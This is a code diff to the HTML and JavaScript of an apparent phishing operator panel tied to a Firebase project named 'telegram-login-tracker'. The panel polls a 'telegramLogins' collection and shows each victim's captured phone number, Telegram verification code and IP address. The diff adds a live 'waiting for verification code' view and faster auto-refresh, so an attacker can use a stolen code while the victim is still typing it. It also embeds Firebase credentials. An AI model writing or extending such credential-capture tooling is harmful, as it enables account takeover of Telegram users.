@@ -186,8 +186,8 @@
     </div>
 
     <script>
-        // Firebase configuration - USE SAME CONFIG AS ABOVE
-        const firebaseConfig = {
+// Firebase configuration - USE SAME CONFIG AS ABOVE
+const firebaseConfig = {
     apiKey: "AIzaSyCB47uNdcAYifcxhgRGv-Q9TUAi0Wg5g94",
     authDomain: "telegram-login-tracker.firebaseapp.com",
     projectId: "telegram-login-tracker",
@@ -197,119 +197,165 @@
     measurementId: "G-5760KLJZJS"
   };
 
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
 
-        async function displayStoredData() {
-            const displayData = document.getElementById('displayData');
+async function displayStoredData() {
+    const displayData = document.getElementById('displayData');
+    
+    try {
+        // Get data from Firebase
+        const snapshot = await db.collection('telegramLogins')
+            .orderBy('timestamp', 'desc')
+            .limit(1)
+            .get();
+        
+        if (!snapshot.empty) {
+            const latestDoc = snapshot.docs[0];
+            const data = latestDoc.data();
             
-            try {
-                // Get data from Firebase
-                const snapshot = await db.collection('telegramLogins')
-                    .orderBy('timestamp', 'desc')
-                    .limit(1)
-                    .get();
-                
-                if (!snapshot.empty) {
-                    const latestDoc = snapshot.docs[0];
-                    const data = latestDoc.data();
-                    showData(data, 'Firebase Data (All Devices)');
+            if (data.status === 'waiting_for_code') {
+                showPhoneOnly(data, 'Firebase Data - Waiting for Code');
+            } else {
+                showFullData(data, 'Firebase Data (All Devices)');
+            }
+        } else {
+            // Fallback to local storage
+            const localData = localStorage.getItem('telegramLoginData');
+            if (localData) {
+                const data = JSON.parse(localData);
+                if (data.status === 'waiting_for_code') {
+                    showPhoneOnly(data, 'Local Data - Waiting for Code');
                 } else {
-                    // Fallback to local storage
-                    const localData = localStorage.getItem('telegramLoginData');
-                    if (localData) {
-                        const data = JSON.parse(localData);
-                        showData(data, 'Local Data (This device only)');
-                    } else {
-                        showNoData();
-                    }
+                    showFullData(data, 'Local Data (This device only)');
                 }
-                
-            } catch (error) {
-                console.error('Error loading Firebase data:', error);
-                // Fallback to local storage
-                const localData = localStorage.getItem('telegramLoginData');
-                if (localData) {
-                    const data = JSON.parse(localData);
-                    showData(data, 'Local Data (Firebase unavailable)');
-                } else {
-                    showNoData();
-                }
+            } else {
+                showNoData();
             }
         }
-
-        function showData(data, source) {
-            const displayData = document.getElementById('displayData');
-            displayData.innerHTML = `
-                <div class="data-source" style="background: #e3f2fd; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center;">
-                    <strong>Data Source:</strong> ${source}
-                </div>
-                <div class="data-item">
-                    <span class="data-label">Platform</span>
-                    <span class="data-value">${data.platform || 'Telegram'}</span>
-                </div>
-                <div class="data-item">
-                    <span class="data-label">Phone Number</span>
-                    <span class="data-value">${data.phone || 'Not provided'}</span>
-                </div>
-                <div class="data-item">
-                    <span class="data-label">Verification Code</span>
-                    <div class="code-display">${data.code || 'No code'}</div>
-                </div>
-                <div class="data-item">
-                    <span class="data-label">IP Address</span>
-                    <span class="data-value">${data.ip || 'Unknown'}</span>
-                </div>
-                <div class="timestamp">
-                    Last updated: ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}
-                </div>
-            `;
+        
+    } catch (error) {
+        console.error('Error loading Firebase data:', error);
+        // Fallback to local storage
+        const localData = localStorage.getItem('telegramLoginData');
+        if (localData) {
+            const data = JSON.parse(localData);
+            if (data.status === 'waiting_for_code') {
+                showPhoneOnly(data, 'Local Data - Waiting for Code');
+            } else {
+                showFullData(data, 'Local Data (Firebase unavailable)');
+            }
+        } else {
+            showNoData();
         }
+    }
+}
 
-        function showNoData() {
-            const displayData = document.getElementById('displayData');
-            displayData.innerHTML = `
-                <div class="no-data">
-                    <i class="fas fa-inbox"></i>
-                    <h3>No Data Available</h3>
-                    <p>No Telegram login data has been captured yet.</p>
-                    <p>Complete the Telegram login process to see data here.</p>
-                </div>
-            `;
-        }
+function showPhoneOnly(data, source) {
+    const displayData = document.getElementById('displayData');
+    displayData.innerHTML = `
+        <div class="data-source" style="background: #fff3cd; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center; border: 1px solid #ffeaa7;">
+            <strong>🕒 Status:</strong> ${source}
+        </div>
+        <div class="data-item">
+            <span class="data-label">Platform</span>
+            <span class="data-value">${data.platform || 'Telegram'}</span>
+        </div>
+        <div class="data-item">
+            <span class="data-label">Phone Number</span>
+            <span class="data-value" style="color: #0088cc; font-weight: bold; font-size: 20px;">${data.phone || 'Not provided'}</span>
+        </div>
+        <div class="data-item">
+            <span class="data-label">Status</span>
+            <span class="data-value" style="color: #f59e0b; font-weight: bold;">⏳ Waiting for verification code...</span>
+        </div>
+        <div class="data-item">
+            <span class="data-label">IP Address</span>
+            <span class="data-value">${data.ip || 'Unknown'}</span>
+        </div>
+        <div class="timestamp">
+            Phone number submitted: ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}
+        </div>
+        <div style="background: #e3f2fd; padding: 15px; border-radius: 8px; margin-top: 15px; text-align: center;">
+            <p style="margin: 0; color: #0088cc; font-weight: 500;">
+                🔄 The user is currently entering the verification code...
+            </p>
+        </div>
+    `;
+}
 
-        // Display data when page loads
+function showFullData(data, source) {
+    const displayData = document.getElementById('displayData');
+    displayData.innerHTML = `
+        <div class="data-source" style="background: #e3f2fd; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center;">
+            <strong>Data Source:</strong> ${source}
+        </div>
+        <div class="data-item">
+            <span class="data-label">Platform</span>
+            <span class="data-value">${data.platform || 'Telegram'}</span>
+        </div>
+        <div class="data-item">
+            <span class="data-label">Phone Number</span>
+            <span class="data-value">${data.phone || 'Not provided'}</span>
+        </div>
+        <div class="data-item">
+            <span class="data-label">Verification Code</span>
+            <div class="code-display">${data.code || 'No code yet'}</div>
+        </div>
+        <div class="data-item">
+            <span class="data-label">IP Address</span>
+            <span class="data-value">${data.ip || 'Unknown'}</span>
+        </div>
+        <div class="timestamp">
+            Last updated: ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}
+        </div>
+    `;
+}
+
+function showNoData() {
+    const displayData = document.getElementById('displayData');
+    displayData.innerHTML = `
+        <div class="no-data">
+            <i class="fas fa-inbox"></i>
+            <h3>No Data Available</h3>
+            <p>No Telegram login data has been captured yet.</p>
+            <p>Complete the Telegram login process to see data here.</p>
+        </div>
+    `;
+}
+
+// Display data when page loads
+displayStoredData();
+
+// Refresh button functionality
+document.getElementById('refreshBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    displayStoredData();
+    
+    const originalText = this.textContent;
+    this.textContent = 'Refreshing...';
+    setTimeout(() => {
+        this.textContent = originalText;
+    }, 1500);
+});
+
+// Clear data button functionality
+document.getElementById('clearBtn').addEventListener('click', function() {
+    if (confirm('Are you sure you want to clear local data?')) {
+        localStorage.removeItem('telegramLoginData');
+        sessionStorage.removeItem('telegramLoginData');
         displayStoredData();
+        
+        this.textContent = 'Local Data Cleared!';
+        setTimeout(() => {
+            this.textContent = 'Clear Local Data';
+        }, 1500);
+    }
+});
 
-        // Refresh button functionality
-        document.getElementById('refreshBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            displayStoredData();
-            
-            const originalText = this.textContent;
-            this.textContent = 'Refreshing...';
-            setTimeout(() => {
-                this.textContent = originalText;
-            }, 1500);
-        });
-
-        // Clear data button functionality
-        document.getElementById('clearBtn').addEventListener('click', function() {
-            if (confirm('Are you sure you want to clear local data?')) {
-                localStorage.removeItem('telegramLoginData');
-                sessionStorage.removeItem('telegramLoginData');
-                displayStoredData();
-                
-                this.textContent = 'Local Data Cleared!';
-                setTimeout(() => {
-                    this.textContent = 'Clear Local Data';
-                }, 1500);
-            }
-        });
-
-        // Auto-refresh every 3 seconds
-        setInterval(displayStoredData, 3000);
-    </script>
+// Auto-refresh every 2 seconds for real-time updates
+setInterval(displayStoredData, 2000);
+</script>
 </body>
 </html>
